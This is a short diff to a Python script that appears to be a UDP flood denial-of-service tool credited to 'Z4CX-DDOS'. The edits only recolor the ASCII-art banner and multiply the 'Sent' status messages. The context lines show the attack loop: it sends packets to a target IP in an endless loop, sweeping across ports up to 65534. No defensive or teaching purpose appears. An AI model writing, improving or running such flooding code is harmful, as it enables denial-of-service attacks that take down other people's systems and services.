@@ -22,9 +22,9 @@ print("")
 print("\033[91m  ⁰ ⁰ ⁰ ⁰      ⁰  ⁰     \033[0m")
 print("\033[91m       ⁰      ⁰   ⁰      \033[0m")
 print("\033[91m      ⁰      ⁰    ⁰      \033[0m")
-print("\033[30m     ⁰      ⁰ ⁰ ⁰ ⁰       \033[0m")
-print("\033[30m    ⁰             ⁰⁰      \033[0m")
-print("\033[30m   ⁰ ⁰ ⁰ ⁰        ⁰        \033[0m")
+print("\033[32m     ⁰      ⁰ ⁰ ⁰ ⁰       \033[0m")
+print("\033[32m    ⁰             ⁰⁰      \033[0m")
+print("\033[33m   ⁰ ⁰ ⁰ ⁰        ⁰        \033[0m")
 print ("\033[01mAuthor   : Z4CX-DDOS\033[0m")
 print ("\033[01mgithub   : https://github.com/Z4CX-DDOS\033[0m")
 print("")
@@ -55,7 +55,9 @@ while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print(f"\033[97mSent packet:. " +ip+ "\033[0m" )
+     print(f"\033[97mSent:... " +ip+ "\033[0m" )
+     print(f"\033[94mSent:.... " +ip+ "\033[0m" )
+     print(f"\033[95mSent:..... " +ip+ "\033[0m" )
      if port == 65534:
        port = 1
 
